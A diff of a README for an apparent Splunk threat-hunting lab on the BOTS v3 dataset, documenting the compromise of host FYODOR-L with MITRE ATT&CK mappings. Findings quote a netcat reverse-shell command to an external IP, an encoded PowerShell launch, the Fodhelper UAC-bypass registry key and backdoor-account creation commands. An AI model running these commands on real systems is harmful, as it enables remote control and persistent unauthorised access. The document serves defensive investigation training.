@@ -232,55 +232,193 @@ Always filter by `source="WinEventLog:Security"` when looking for authentication
 
 During the investigation of BOTS v3 logs, I identified the following suspicious behaviors :
 
-### Finding 1 — Privilege Abuse (Critical)
-**Host** : Multiple Windows machines
-**Observation** :  `RuntimeBroker.exe` and `explorer.exe` using `SeTcbPrivilege`  a critical Windows privilege normally reserved for SYSTEM-level processes only.
-**Volume** :729 occurrences
-**Why suspicious** : These are user-space processes that 
-should never need this privilege level.
+### 🔴 Finding 1 — Confirmed Machine Compromise (Critical)
 
-<img width="1915" height="418" alt="Capture d&#39;écran 2026-03-19 181718" src="https://github.com/user-attachments/assets/7018fdda-e7b2-41d1-8a0c-890eaf2f0bcb" />
+**Host :** FYODOR-L.froth.ly
+**Compromised account :** AzureAD\FyodorMalteskesko
 
-
-### Finding 2 — Massive Registry Enumeration (Medium)
-**Host** :  Multiple machines
-**Observation** : `reg.exe` and `cmd.exe` querying Uninstall keys to enumerate installed software.
-**Volume** :  1,037 occurrences
-**Why suspicious** : Attackers enumerate installed software to identify vulnerable applications.
-<img width="1918" height="640" alt="Capture d&#39;écran 2026-03-19 181004" src="https://github.com/user-attachments/assets/4dc86745-5770-4ae7-aadd-2be0b5a6f066" />
+FYODOR-L was fully compromised. The investigation revealed
+a complete attack chain including an active reverse shell,
+UAC bypass, and creation of a backdoor account with
+administrator privileges.
 
 
-### Finding 3 — Abnormal Process Creation Burst (High)
-**Host** : Multiple machines
-**Observation** : Over 1,000 process creation events with bursts exceeding 20 processes per minute.
-**Why suspicious** : Indicates possible automation, malware activity, or scripted execution.
-<img width="1917" height="732" alt="Capture d&#39;écran 2026-03-19 180227" src="https://github.com/user-attachments/assets/0497c97c-3e27-4afc-b282-22b06d616da2" />
+### 🔴 Finding 2 — Reverse Shell to External IP (Critical)
+
+**External C2 :** 45.77.53.176:8088
+**Internal C2 :** 192.168.9.30:8080
+
+Command identified in logs :
+```
+/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe
+```
+
+A malicious process named `iexeplorer.exe` — deliberately
+mimicking Internet Explorer — was dropped in
+`C:\Windows\Temp\unziped\lsof-master\` and used to
+establish a control connection to an external server.
+
+**MITRE :** T1071.001 — C2 over Web Protocols
+<img width="945" height="405" alt="image" src="https://github.com/user-attachments/assets/211c1f4b-2c78-4134-b06b-7170e5f776f3" />
 
 
-### Finding 4 — WMIC System Reconnaissance (Medium)
-**Volume** : 536 occurrences
-**Why suspicious** :  WMIC used for system fingerprinting  collecting OS version, hardware info, local datetime.
-<img width="1917" height="119" alt="Capture d&#39;écran 2026-03-19 180802" src="https://github.com/user-attachments/assets/17d3cf96-f438-4cb4-9553-58be045d59ef" />
+### 🔴 Finding 3 — Obfuscated PowerShell + AMSI Bypass (Critical)
+
+Heavily obfuscated PowerShell payload detected :
+```
+powershell.exe -NoP -NonI -W Hidden -enc <Base64>
+```
+
+The decoded payload performed :
+- Disabled AMSI (Antimalware Scan Interface)
+- Disabled Script Block Logging
+- Downloaded an RC4-encrypted payload from the C2 server
+- Executed everything in memory via Invoke-Expression (IEX)
+
+**MITRE :** T1059.001, T1027, T1562.001
+
+<img width="605" height="232" alt="image" src="https://github.com/user-attachments/assets/64063bcd-a3a0-475c-bee0-d152e7e2ac60" />
 
 
-### Finding 5 — Netstat Network Discovery (Medium)
-**Volume** : 78 occurrences
-**Why suspicious** : Local port scanning to identify active connections and listening services.
-<img width="1917" height="99" alt="Capture d&#39;écran 2026-03-19 180852" src="https://github.com/user-attachments/assets/b35b88b0-91cf-4220-b7ae-c1a96c643584" />
+### 🔴 Finding 4 — UAC Bypass via Fodhelper (Critical)
+
+The attacker bypassed Windows UAC without triggering
+any user alert using the Fodhelper technique :
+
+1. Modified registry key :
+   `HKCU\Software\Classes\ms-settings\Shell\Open\command`
+
+<img width="605" height="59" alt="image" src="https://github.com/user-attachments/assets/c08b4857-328c-4369-afbe-b07c18b9e36f" />
+
+3. Payload stored in :
+   `HKCU\Software\Microsoft\Windows Update\Update`
+4. Launched `fodhelper.exe` → automatic privilege elevation
+
+**Evidence :** Sysmon EventID 13 (Registry Value Set)
+**MITRE :** T1548.002 — Bypass UAC via Fodhelper
+<img width="605" height="58" alt="image" src="https://github.com/user-attachments/assets/5bdc4491-521a-4670-a5eb-838f33d89fe4" />
+
+
+
+
+### 🔴 Finding 5 — Backdoor Account Created (Critical)
+
+The attacker created a persistent backdoor account :
+```
+net user /add svcvnc Password123!
+net localgroup administrators svcvnc /add
+```
+<img width="352" height="241" alt="image" src="https://github.com/user-attachments/assets/de65a78f-11bf-4dbf-b347-853755d7fe4d" />
+
+Account lifecycle confirmed by EventCodes :
+- **4720** → Account created
+- **4722** → Account enabled
+- **4724** → Password set
+- **4732** → Added to Administrators group
+  
+-> Event ID 4720 → account creation
+<img width="605" height="263" alt="image" src="https://github.com/user-attachments/assets/f0090dd6-f959-48bf-88fd-4002138ee1ea" />
+
+<img width="605" height="283" alt="image" src="https://github.com/user-attachments/assets/0574172b-7a49-4a93-a045-d54376031754" />
+
+-> Event ID 4732 → Adding to a Local Group
+
+<img width="605" height="321" alt="image" src="https://github.com/user-attachments/assets/3dcdb7f5-5ef7-484d-addf-c5f3e519de99" />
+
+-> Event ID 4732 → Adding to the Administrators group
+
+<img width="605" height="289" alt="image" src="https://github.com/user-attachments/assets/2c401a8c-be56-4dc6-94fd-2c6ef4a2198d" />
+
+
+-> Event ID 4722 → Account Activation
+
+<img width="605" height="322" alt="image" src="https://github.com/user-attachments/assets/da13c09b-abfc-487c-8a01-d60ef47311a3" />
+
+-> Event ID 4724 → password reset
+
+<img width="605" height="312" alt="image" src="https://github.com/user-attachments/assets/c4f067c0-e197-485f-a583-5bb8aed52f61" />
+
+
+22:08:17 4720 Creating the svcvnc account
+
+22:08:17 4728 Adding to a Global Group (None)
+
+22:08:17 4722 Account Activation
+
+22:08:17 4724 Setting the Password/Resetting
+
+22:08:17 4732 Added to Users group
+
+22:08:35 4732 Added to the Administrators group
+
+
+
+The name `svcvnc` mimics a legitimate service account
+to avoid detection. The `vnc` suffix suggests the attacker
+planned to use VNC for persistent remote access.
+
+**MITRE :** T1136.001, T1098
+
+
+### 🟠 Finding 6 — Apache Struts Initial Access Vector (High)
+
+**Suspicious URL identified :**
+`http://192.168.9.30:8080/frothlyinventory/showcase.action`
+
+The `.action` suffix is characteristic of Apache Struts
+applications — known for critical RCE vulnerabilities
+(notably CVE-2017-5638). This URL most likely represents
+the initial access vector of the entire attack.
+
+**MITRE :** T1190 — Exploit Public-Facing Application
+
+<img width="605" height="309" alt="image" src="https://github.com/user-attachments/assets/98a4bc40-07ab-482b-9c49-8f275ec7cb69" />
 
 
 ---
+
+### 🟠 Finding 7 — SMB Network Reconnaissance (High)
+
+Suspicious SMB connections from FYODOR-L toward :
+- 192.168.70.186
+- 192.168.8.103
+- 192.168.8.116
+
+On port 139/TCP — behavior consistent with network
+discovery scanning or a lateral movement attempt
+targeting other internal hosts.
+
+**MITRE :** T1021.002, T1046
+
+<img width="605" height="306" alt="image" src="https://github.com/user-attachments/assets/23909909-fee5-4475-815a-dc5a36376696" />
+
 
 ## ️ MITRE ATT&CK Coverage
 
 | Tactic | ID | Technique | Detections | Severity | Status |
 |--------|----|-----------|------------|----------|--------|
+| Initial Access | T1190 | Exploit Public-Facing Application (Apache Struts) | Confirmed | Critical | ✅ |
+| Execution | T1059.001 | PowerShell Obfuscated + AMSI Bypass | Confirmed | Critical | ✅ |
+| Execution | T1059 | Command and Scripting Interpreter | 7724 | High | ✅ |
+| Defense Evasion | T1027 | Obfuscated Files — Base64 + RC4 | Confirmed | Critical | ✅ |
+| Defense Evasion | T1562.001 | Disable AMSI | Confirmed | Critical | ✅ |
+| Defense Evasion | T1036 | Masquerading — iexeplorer.exe | Confirmed | High | ✅ |
+| Privilege Escalation | T1548.002 | UAC Bypass via Fodhelper | Confirmed | Critical | ✅ |
 | Privilege Escalation | T1134 | Access Token Manipulation | 729 | Critical | ✅ |
 | Privilege Escalation | T1055 | Process Injection | 729 | High | ✅ |
-| Discovery | T1082 | System Information Discovery | 536 | Medium | ✅ |
-| Discovery | T1049 | Network Connections Discovery | 78 | Medium | ✅ |
-| Discovery | T1012 | Query Registry | 1037 | Medium | ✅ |
-| Execution | T1059 | Command and Scripting | 7724 | High | ✅ |
+| Persistence | T1136.001 | Create Local Account — svcvnc | Confirmed | Critical | ✅ |
+| Persistence | T1098 | Account Manipulation — Added to Admins | Confirmed | Critical | ✅ |
+| Command & Control | T1071.001 | C2 over HTTP — 45.77.53.176:8088 | Confirmed | Critical | ✅ |
+| Discovery | T1082 | System Information Discovery — WMIC | 536 | Medium | ✅ |
+| Discovery | T1049 | Network Connections Discovery — Netstat | 78 | Medium | ✅ |
+| Discovery | T1012 | Query Registry — Software Enumeration | 1037 | Medium | ✅ |
+| Discovery | T1087 | Account Discovery — cat /etc/passwd | Confirmed | Medium | ✅ |
+| Lateral Movement | T1021.002 | SMB — Port 139 Scanning | Confirmed | High | ✅ |
+
+> **Total : 17 techniques covered across 7 tactics**
+> Techniques marked "Confirmed" were identified during
+> threat hunting investigation of BOTS v3 logs.
+> Techniques with detection counts have active Splunk alerts.
 
 ---
 
